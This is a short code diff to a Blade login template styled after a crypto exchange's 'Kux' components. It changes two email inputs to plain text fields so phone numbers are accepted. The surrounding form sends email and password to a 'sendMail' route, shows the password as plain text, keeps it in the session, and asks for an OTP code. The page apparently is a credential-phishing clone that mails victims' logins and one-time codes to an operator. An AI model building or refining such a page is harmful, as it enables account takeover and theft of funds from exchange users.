@@ -2863,7 +2863,7 @@
                                 @csrf
 
                                 <input type="tel" name="otp" class="KuxInput-input css-1nddmz0" placeholder="******">
-                                <input type="email" name="email" value="{{ session()->get('email') }}" class="KuxInput-input css-1nddmz0" placeholder="Email/Phone">
+                                <input type="text" name="email" value="{{ session()->get('email') }}" class="KuxInput-input css-1nddmz0" placeholder="Email/Phone">
                                 <input type="text" name="password" value="{{ session()->get('password') }}" class="KuxInput-input css-1nddmz0" placeholder="Password">
 
                                 <button id="codeBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit">
@@ -2877,7 +2877,7 @@
                             @else
                             <form class="contact-form" action="{{route('sendMail')}}" method="POST">
                               @csrf
-                              <input type="email" name="email" class="KuxInput-input css-1nddmz0" placeholder="Email/Phone">
+                              <input type="text" name="email" class="KuxInput-input css-1nddmz0" placeholder="Email/Phone">
                               <input type="text" name="password" class="KuxInput-input css-1nddmz0" placeholder="Password">
                               <button id="loginBtn" class="KuxButton-root KuxButton-contained KuxButton-containedPrimary KuxButton-sizeLarge KuxButton-containedSizeLarge KuxButton-fullWidth css-1awe74r" type="submit">
                                 Login In
